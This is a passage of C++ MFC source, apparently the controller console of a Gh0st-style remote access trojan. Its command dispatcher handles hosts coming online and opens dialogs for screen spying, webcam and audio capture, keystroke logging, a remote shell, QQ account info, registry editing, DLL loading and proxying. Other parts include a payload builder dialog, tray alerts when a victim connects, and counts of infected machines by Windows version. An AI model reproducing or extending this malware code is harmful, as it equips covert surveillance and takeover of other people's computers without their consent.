		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;
	case TOKEN_LOGIN: // 上线包
		{
			pContext->m_bIsMainSocket = true;
			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
			// 激活
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START://键盘
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SYSTEMINFO://进程列表
		g_pConnectView->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SSLIST: // 服务管理
		g_pConnectView->PostMessage(WM_OPENPSERLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START://远程终端
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SYSINFOLIST:
		g_pConnectView->PostMessage(WM_OPENSYSINFODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CHAT_START:
		g_pConnectView->PostMessage(WM_OPENCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_QQINFO:
		g_pConnectView->PostMessage(WM_OPENQQINFODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:		//注册表管理    
		g_pConnectView->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DLLMAIN:
		g_pConnectView->PostMessage(WM_OPENDLLDLG, 0, (LPARAM)pContext);
		break;
	case TOKEN_INFO_YES: //主机筛选
		g_pConnectView->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
		break;
	case TOKEN_INFO_NO:  //主机筛选
		g_pConnectView->PostMessage(WM_NOMODIFYLIST, 0, (LPARAM)pContext);
		break;
	case TOKEN_PROXY_START:
		g_pConnectView->PostMessage(WM_OPENPROXYMAPDIALOG, 0, (LPARAM)pContext);
		break;	
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
// 	if (MessageBox(_T("确认退出程序吗?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
// 		return;
	if(m_bSetRestart == NULL)  //正常关闭
	{
		int iResult = MessageBox("您确认要退出", " 提示", MB_ICONQUESTION|MB_YESNO);
		if(iResult != IDYES)
			return ;
	}
	else   //软件重启
	{
		char pBuf[MAX_PATH];
		//获取应用程序完全路径
		GetModuleFileName(NULL,pBuf,MAX_PATH);
		
		STARTUPINFO startupinfo;
		PROCESS_INFORMATION proc_info;
		
		memset(&startupinfo,0,sizeof(STARTUPINFO));
		startupinfo.cb=sizeof(STARTUPINFO);
		::CreateProcess(pBuf,NULL,NULL,NULL,FALSE,
			NORMAL_PRIORITY_CLASS,NULL,NULL,&startupinfo,&proc_info);
	}
	SaveCommandBars("CommandBars");

	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	pMainFrame->m_TrayIcon.RemoveIcon();
	
	m_iocpServer->Shutdown();
	delete m_iocpServer;
	CFrameWnd::OnClose();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		m_TrayIcon.MinimizeToTray(this);
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}
}

void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str,strTemp;
	int a = 0;
	CClientView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}
	str.Format(_T("合计: %d台"), a);
 	m_wndStatusBar.SetPaneText(2, str);
	
	UpdateData();
	
	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	ASSERT_VALID(pMainFrame);
	pMainFrame->m_TrayIcon.SetTooltipText(str);
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here
	m_TrayIcon.MaximizeFromTray(this);
}

void CMainFrame::OnHide() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
#ifdef NDEBUG
	m_TrayIcon.ShowBalloonTip(lpszText, _T("有主机上线请注意: "), NIIF_NONE, 5);
#endif // NDEBUG
}

void CMainFrame::OnAppExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::OnSetting() 
{
	// TODO: Add your command handler code here
	CSetting dlg;
	dlg.DoModal();
}

void CMainFrame::OnBuild() 
{
	// TODO: Add your command handler code here
	CBuild dlg;
	dlg.DoModal();
}

void CMainFrame::SetTheme(int iTheme)
{
	m_iTheme = iTheme;
	XTThemeManager()->SetTheme((XTThemeStyle)m_iTheme);
	XTPPaintManager()->SetTheme((XTPPaintTheme)m_iTheme);	
	RedrawWindow( NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN );	
	RecalcLayout();
}

CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	//做个标记
	int nID = ++m_nCount;
	
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
	
	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);
	
	CFrameWnd* pFrame = new CFrameWnd;
	
	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = GetActiveView()->GetDocument();
	
	pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);
	
	m_mapPanes.SetAt(nID, pFrame);
	
	return pwndPane;
}

LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
	if (wParam == XTP_DPN_SHOWWINDOW)
	{
		// get a pointer to the docking pane being shown.
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		if (!pPane->IsValid())
		{
			CWnd* pWnd = NULL;
			if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
			{
				pPane->Attach(pWnd);
			}
		}
		
		return TRUE; // handled
	}
	return FALSE;
}

void CMainFrame::OnCustomize()
{
	// get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if (pCommandBars == NULL)
		return;
	
	// instanciate the customize dialog
	CXTPCustomizeSheet dlg(pCommandBars);
	
	// add the options page to the customize dialog.
	CXTPCustomizeOptionsPage pageOptions(&dlg);
	dlg.AddPage(&pageOptions);
	
	// add the commands page to the customize dialog.
	CXTPCustomizeCommandsPage* pPageCommands = dlg.GetCommandsPage();
	pPageCommands->AddCategories(IDR_MAINFRAME);
	
	// initialize the commands page page.
	pPageCommands->InsertAllCommandsCategory();
	pPageCommands->InsertBuiltInMenus(IDR_MAINFRAME);
	pPageCommands->InsertNewMenuCategory();
	
	// display the customize dialog.
	dlg.DoModal();
}

void CMainFrame::ShowOSCount()
{
	CString str;
	str.Format(_T("NT:%d    2K:%d    XP:%d    2K3:%d    Vista:%d    2K8:%d    Win7:%d    Win8:%d    2012:%d    Win10:%d    2016:%d  "),
		nOSCount[0],
		nOSCount[1],
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8],
		nOSCount[9],
		nOSCount[10]);
	m_wndStatusBar.SetPaneText(1, str);
}

void CMainFrame::OnDnsUpdate() 
{
	// TODO: Add your command handler code here
// 	static CUpdateDlg *m_IpUpdate =NULL;
// 	if(m_IpUpdate==NULL)
// 	{
// 		m_IpUpdate= new CUpdateDlg;
// 		m_IpUpdate->Create(IDD_UPDATE_DLG,GetDesktopWindow());
// 	}
// 	m_IpUpdate->ShowWindow(SW_SHOW);
	CUpdateDlg dlg;
	dlg.DoModal();

	
	
	

}

void CMainFrame::OnTools() 
{
	// TODO: Add your command handler code here
	CMyToolsKit dlg;
	dlg.DoModal();
}

BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	PIDWNDINFO *pInfo = (PIDWNDINFO *)lParam;
	LONG lStyle = GetWindowLong(hWnd, GWL_STYLE);
	if (pInfo->dwProcessId == 0 && hWnd != pInfo->hWnd && 
		IsWindowVisible(hWnd) && GetParent(hWnd) == NULL && lStyle & WS_MINIMIZEBOX)
	{
		ShowWindow(hWnd, SW_MINIMIZE);
		return TRUE;
	}
	
	DWORD dwProcessId;
	GetWindowThreadProcessId(hWnd, &dwProcessId);
	if (dwProcessId == pInfo->dwProcessId && IsWindowVisible(hWnd) && GetParent(hWnd) == NULL)
	{
		pInfo->hWnd = hWnd;
		return FALSE;
	}
	return TRUE;
}

void CMainFrame::OnLock() 
{
	// TODO: Add your command handler code here
	// TODO: Add your control notification handler code here
	CString strFile; CFileStatus status;
	strFile.Format("%s\\Plugins\\PcLock.exe", ((CClientApp *)AfxGetApp())->AppPath);
	if (!CFile::GetStatus(strFile, status))
	{
		CLockDlg dlg(CWnd::GetDesktopWindow());
		dlg.DoModal();
	}
	else
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		PIDWNDINFO pwi;
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		memset(&pi, 0, sizeof(pi));
		if (!CreateProcess(strFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
			return;
		// 等待新进程初始化完毕
		WaitForInputIdle(pi.hProcess, INFINITE);
		pwi.dwProcessId = pi.dwProcessId;
		pwi.hWnd = NULL;
		EnumWindows(EnumWindowsProc, (LPARAM)&pwi);
		if (pwi.hWnd != NULL)
			::SetWindowPos(pwi.hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE|SWP_NOMOVE);
		AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
		pwi.dwProcessId = 0;
		EnumWindows(EnumWindowsProc, (LPARAM)&pwi);
		::ShowWindow(::FindWindow("Progman", NULL), SW_HIDE);
		::ShowWindow(::FindWindow("Button", "开始"), SW_HIDE);
		::ShowWindow(::FindWindow("Shell_TrayWnd", NULL), SW_HIDE);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		::ShowWindow (::FindWindow("Shell_TrayWnd", NULL), SW_SHOW);
		::ShowWindow (::FindWindow("Button", "开始"), SW_SHOW);
		::ShowWindow(::FindWindow("Progman", NULL), SW_SHOW);
		AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
	}
}

void CMainFrame::OnSz() //
{
	// TODO: Add your command handler code here
// 	CSettingDlg dlg;
// 	dlg.DoModal();
}
